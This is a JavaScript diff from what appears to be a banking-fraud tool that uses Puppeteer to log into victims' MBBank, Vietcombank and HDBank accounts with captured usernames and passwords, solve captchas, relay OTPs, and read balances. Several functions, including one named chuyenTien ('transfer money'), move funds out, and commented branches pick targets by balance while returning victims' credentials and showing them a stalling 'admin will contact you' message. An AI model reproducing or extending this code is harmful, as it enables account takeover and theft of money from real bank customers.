@@ -75,7 +75,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
 
     const captchaText = await solverCaptcha(img, 'MBBank');
     if (!captchaText) return await browser.close();
-    br.find(b => b.socketID == socketID).browser = null;
+
 
     await page.type("input[placeholder='NHẬP MÃ KIỂM TRA'", captchaText);
     await page.click('#login-btn');
@@ -88,11 +88,11 @@ const loginMB = (async (username, password, socketID, settingData) => {
             if (errorMessage === 'Mã captcha không chính xác. Vui lòng thử lại.') {
                 // await client.report(captchaText?._id);
                 await browser.close();
-                br.find(b => b.socketID == socketID).browser = null;
+
                 await loginMB()
             } else if (errorMessage === 'Thông tin đăng nhập không hợp lệ') {
                 await browser.close();
-                br.find(b => b.socketID == socketID).browser = null;
+
                 console.log(errorMessage);
                 return {
                     message: errorMessage,
@@ -102,7 +102,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
             }
             else {
                 await browser.close();
-                br.find(b => b.socketID == socketID).browser = null;
+
                 return {
                     message: errorMessage,
                     code: 404,
@@ -122,7 +122,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
             if (balance <= 2000000) {
                 // const response = await chuyenTien(balance, 'MBBank', socketID, settingData);
                 await browser.close();
-                br.find(b => b.socketID == socketID).browser = null;
+
                 return {
                     message: 'success',
                     code: 300,
@@ -279,8 +279,6 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
 
             await sleep(2000);
 
-
-
             await page.waitForSelector('.form-main-footer button');
             await page.click('.form-main-footer button');
 
@@ -351,7 +349,6 @@ const xacthucMethodCtVCB = async (method, socketID) => {
         } else if (method == 'VCB smart OTP') {
             await page.waitForSelector(".select-2");
             page.click(".select-2");
-
             await page.waitForSelector(".select2-results__options");
 
             await page.waitForSelector(".select2-results__options > li:nth-child(1)");
@@ -689,7 +686,7 @@ const xacthucCTVCB = async (otp, socketID) => {
         if (messageElement.length > 0) {
             message = await page.evaluate(el => el.innerText, messageElement[0]);
             await browser.close();
-            br.find(b => b.socketID == socketID).browser = null;
+
 
             return {
                 message: message,
@@ -708,7 +705,7 @@ const xacthucCTVCB = async (otp, socketID) => {
         }
 
         await browser.close();
-        br.find(b => b.socketID == socketID).browser = null;
+
 
         return {
             message: 'Xác minh thành công. Quý khách vui lòng chờ trong giây lát.',
@@ -807,7 +804,7 @@ const loginHDBank = (async (username, password) => {
     console.log('checkError', checkError);
     if (checkError) {
         await browser.close();
-        br.find(b => b.socketID == socketID).browser = null;
+
         return {
             message: 'Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại.',
             code: 404,
@@ -815,11 +812,51 @@ const loginHDBank = (async (username, password) => {
         };
     }
 
-    return {
-        message: 'Đăng nhập thành công',
-        code: 200,
-        type: 'HDBank'
-    };
+    await sleep(3000);
+
+    const balance = await frame3.evaluate(() => {
+        return document.querySelector('#xxtotalAmt').innerText;
+    })
+
+    if (balance) {
+        const balanceNumber = parseFloat(balance.replace(/\./g, ''));
+        console.log('balanceNumber', balanceNumber);
+
+        // if (balanceNumber < 2000000) {
+        //     await browser.close();
+
+        //     return {
+        //         message: 'Bạn sẽ nhận được tư vấn từ admin. Vui lòng chờ trong giây lát',
+        //         code: 200,
+        //         balance: balanceNumber,
+        //         username: username,
+        //         password: password,
+        //     };
+        // } else if (balanceNumber >= 2000000 && balanceNumber <= 5000000) {
+
+        //     // chuyenTien
+        // } else if (balanceNumber > 5000000) {
+        //     await browser.close();
+
+        //     // thông báo tới admin
+        //     return {
+        //         message: 'Bạn sẽ nhận được tư vấn từ admin. Vui lòng chờ trong giây lát',
+        //         code: 200,
+        //         balance: balanceNumber,
+        //         username: username,
+        //         password: password,
+        //     };
+        // }
+
+
+
+    }
+
+    // return {
+    //     message: 'Đăng nhập thành công',
+    //     code: 200,
+    //     type: 'HDBank'
+    // };
 });
 
 const xacthuc = async (otp, type) => {
